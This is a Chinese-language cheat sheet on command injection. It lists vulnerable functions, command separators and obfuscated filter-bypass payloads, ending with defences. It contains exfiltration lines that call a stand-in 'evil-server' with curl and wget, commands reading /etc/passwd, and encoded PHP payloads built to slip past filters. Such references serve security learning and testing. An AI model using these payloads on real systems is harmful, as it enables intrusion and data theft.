命令注入
========================================

简介
----------------------------------------
命令注入通常因为指Web应用在服务器上拼接系统命令而造成的漏洞,直接调用操作系统命令(相当于在cmd下敲命令)。

该类漏洞通常出现在调用外部程序完成一些功能的情景下。比如一些Web管理界面的配置主机名/IP/掩码/网关、查看系统信息以及关闭重启等功能，或者一些站点提供如ping、nslookup、提供发送邮件、转换图片等功能都可能出现该类漏洞。

分类
----------------------------------------
- OS命令执行

::

	常见的shell：Windows上的cmd；Unix/Linux上常见的Shell脚本解释器有bash、sh、csh、ksh；

- Web命令执行

::

	PHP:system,exec,passthru,shell_exec,popen,proc_open
	Python:system,popen,subprocess.call,spawn
	Java:java.lang.Runtime.getRuntime().exec(command)

- 数据库命令执行
- 第三方软件命令执行

常见注入方式
----------------------------------------
- 分号分割
- ``||`` ``&&`` ``&`` 分割
- ``|`` 管道符
- ``\r\n`` ``%d0%a0`` 换行 
- 反引号解析
- ``$()`` 替换

无回显技巧
----------------------------------------
- bash反弹shell
- DNS带外数据
- http带外
    - ``curl http://evil-server/$(whoami)``
    - ``wget http://evil-server/$(whoami)``
- 无带外时利用 ``sleep`` 或其他逻辑构造布尔条件

命令分隔符
----------------------------------------
- ``%0a`` / ``%0d`` / ``\n`` / ``\r``
- ``;``
- ``&`` / ``&&``

常见绕过方式
----------------------------------------

字符串拼接绕过
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- ``(p.h.p.i.n.f.o)();``
- ``(sy.(st).em)(whoami);``
- ``(sy.(st).em)(who.ami);``
- ``(s.y.s.t.e.m)("whoami");``
- ``.......``

字符串转义绕过
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- ``"\x70\x68\x70\x69\x6e\x66\x6f"();#phpinfo();``
- ``"\163\171\163\164\145\155"('whoami');#system('whoami');``
- ``"\u{73}\u{79}\u{73}\u{74}\u{65}\u{6d}"('id');#system('whoami');``
- ``"\163\171\163\164\145\155"("\167\150\157\141\155\151");#system('whoami');``
- ``.......``

多次传参绕过
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- 查询字符串：``?1=system&2=whoami`` body：``cmd=$_GET[1]($_GET[2]);``

空格绕过
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- ``<`` 符号 ``cat<123``
- ``\t`` / ``%09``
- ``${IFS}`` 其中{}用来截断，比如cat$IFS2会被认为IFS2是变量名。另外，在后面加个$可以起到截断的作用，一般用$9，因为$9是当前系统shell进程的第九个参数的持有者，它始终为空字符串

内置函数访问绕过
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- get_defined_functions()：返回所有已定义函数的数组
- cmd=get_defined_functions()[internal][358](whoami);


异或绕过
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- ``$_=('%01'^'%60').('%08'^'%7b').('%08'^'%7b').('%05'^'%60').('%09'^'%7b').('%08'^'%7c');$__='_'.('%07'^'%40').('%05'^'%40').('%09'^'%5d');$___=$$__;$_($___[_]);&_=phpinfo();``
- ``${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();&%ff=phpinfo``
- ``//${_GET}{%ff}();&%ff=phpinfo``

URL编码绕过
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- ``(~%8F%97%8F%96%91%99%90)();`` -> ``#phpinfo();``
- ``(~%8C%86%8C%8B%9A%92)(~%88%97%90%9E%92%96);`` -> ``#system('whoami');``

黑名单绕过
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- ``a=l;b=s;$a$b``
- base64 ``echo "bHM=" | base64 -d``
- ``/?in/?s`` => ``/bin/ls``
- 连接符 ``cat /etc/pass'w'd``
- 未定义的初始化变量 ``cat$x /etc/passwd``

长度限制绕过
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
::

    >wget\
    >foo.\
    >com
    ls -t>a
    sh a

上面的方法为通过命令行重定向写入命令，接着通过ls按时间排序把命令写入文件，最后执行
直接在Linux终端下执行的话,创建文件需要在重定向符号之前添加命令
这里可以使用一些诸如w,[之类的短命令，(使用ls /usr/bin/?查看)
如果不添加命令，需要Ctrl+D才能结束，这样就等于标准输入流的重定向
而在php中 , 使用 shell_exec 等执行系统命令的函数的时候 , 是不存在标准输入流的，所以可以直接创建文件

disable_functions绕过
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- php.ini的disable_functions中设置了禁用函数phpinfo,eval,passthru,exec,system,chroot等
- 系统组件绕过
- ImageMagick漏洞绕过
- 环境变量LD_PRELOAD绕过
- pcntl_exec绕过

防御
----------------------------------------
- 不使用时禁用相应函数
- 尽量不要执行外部的应用程序或命令
- 做输入的格式检查
- 转义命令中的所有shell元字符
    - shell元字符包括 ``#&;`,|*?~<>^()[]{}$\``
